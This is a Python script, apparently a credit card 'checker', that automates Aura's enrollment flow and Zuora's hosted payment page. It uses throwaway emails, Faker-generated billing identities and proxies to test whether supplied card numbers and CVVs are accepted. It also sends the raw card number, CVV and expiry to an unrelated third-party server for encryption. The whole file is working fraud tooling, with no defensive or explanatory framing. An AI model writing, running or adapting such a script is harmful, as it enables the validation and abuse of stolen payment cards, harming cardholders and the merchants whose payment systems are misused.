from httpx import AsyncClient
import json, random, string
from urllib.parse import urlparse, parse_qs, unquote
from faker import Faker

fake = Faker()

def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )


def random_email():
    random_letters = "".join(random.choices(string.ascii_lowercase, k=10))
    return f"{random_letters}@gmail.com"


async def zuora_adyen(cc, mes, ano, cvv, proxyg):
    
    if len(ano) == 2:
        ano = "20" + ano
    if len(mes) == 1:
        mes = "0" + mes
    bin = cc[:6]
    type_card = "Visa"
    if cc[0] == "5":
        type_card = "MasterCard"
    if cc[0] == "3":
        type_card = "AmericanExpress"
    if cc[0] == "6":
        type_card = "Discover"

    email = random_email()

    async with AsyncClient(follow_redirects=True, verify=True, proxies=proxyg, timeout=None) as s:
        ip = await s.get('https://api.ipify.org/')
        print(ip.text)
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "es",
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        }

        params = {
            "cc": "a_pc_gw_dtp_hp",
            "offer_code": "drlp89wqrg",
        }

        response = await s.get(
            "https://my.aura.com/enrollment/v27/1",
            params=params,
            headers=headers,
        )

        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "es",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://my.aura.com",
            "Referer": "https://my.aura.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "authorization": "Basic YXVyYXN1aXRlX3Byb2RfZnJvbnRlbmQ6ZmM3cGRkOXQ4NHEycDFhYnIxdjZhbHdvNDgxOW50dWFldGQyeHRrbw==",
        }

        json_data = {"alias": email}

        response = await s.post(
            "https://api.aurasvc.io/auth/session/guest",
            headers=headers,
            json=json_data,
        )
        response = json.loads(response.text)
        refresh_token = response["refresh_token"]
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "es",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://my.aura.com",
            "Referer": "https://my.aura.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "authorization": "Basic YXVyYXN1aXRlX3Byb2RfZnJvbnRlbmQ6ZmM3cGRkOXQ4NHEycDFhYnIxdjZhbHdvNDgxOW50dWFldGQyeHRrbw==",
        }

        json_data = {
            "refresh_token": refresh_token,
        }

        response = await s.post(
            "https://api.aurasvc.io/auth/session/refresh_token",
            headers=headers,
            json=json_data,
        )

        response = json.loads(response.text)
        access_token = response["access_token"]

        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "es",
            "Authorization": f"Bearer {access_token}",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://my.aura.com",
            "Referer": "https://my.aura.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        }

        json_data = {
            "card_iin": bin,
            "addr_street1": fake.street_address(),
            "addr_street2": "",
            "addr_city": fake.city(),
            "addr_state": fake.state(),
            "addr_postal": fake.zipcode(),
            "addr_country": "USA",
            "email": email,
        }

        response = await s.post(
            "https://api.aurasvc.io/billing/authorize/card",
            headers=headers,
            json=json_data,
        )

        response = response.json()
        page_id = response["pageId"]
        tenant_id = response["tenantId"]
        token = response["token"]
        signature = response["signature"]
        zuora_key = response["key"]
        dfp_session_id = response["dfp_session_id"]

        base_url = "https://ykz-apisites.sh-ykza-env.com"
        endpoint = "/encrypt/zoura"
        url = base_url + endpoint
        headers = {
            "apisites": "FREEXXXX1-SERVER-[0x10][0xf]"
        }
        payload = {
            "pk": zuora_key,
            "data":[f"#{cc}#{cvv}#{mes}#{ano}"]
        }


        response = await s.post(url, headers=headers, json=payload)
        encrypted_values =  response.json()
        print( encrypted_values)
        encrypted_pro = encrypted_values.get('response')[0]
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "es",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://my.aura.com",
            "Referer": "https://my.aura.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        }

        data = {
            "method": "submitPage",
            "field_style": "iframe",
            "host": "https://card.aurasvc.io",
            "id": page_id,
            "tenantId": tenant_id,
            "token": token,
            "signature": signature,
            "field_key": zuora_key,
            "field_creditCardType": type_card,
            "field_creditCardHolderName": fake.first_name(),
            "field_creditCardAddress1": fake.street_address(),
            "field_creditCardAddress2": "",
            "field_creditCardCity": fake.city(),
            "field_creditCardState": fake.state(),
            "field_creditCardPostalCode": fake.zipcode(),
            "field_creditCardCountry": "USA",
            "field_email": email,
            "encrypted_fields": "#field_creditCardNumber#field_cardSecurityCode#field_creditCardExpirationMonth#field_creditCardExpirationYear",
            "encrypted_values": encrypted_pro,
            "dfp_session_id": dfp_session_id,
        }

        response = await s.post(
            "https://www.zuora.com/apps/PublicHostedPageLite.do",
            headers=headers,
            data=data,
        )
        response = unquote(str(response.url))
        parsed_url = urlparse(response)
        query_params = parse_qs(parsed_url.query)
        parsed_url = urlparse(response)
        query_params = parse_qs(parsed_url.query)
        
        success = query_params["success"][0]
        if success == True or success == "true":
            return True

        errorMessage = query_params["errorMessage"][0]
        return errorMessage   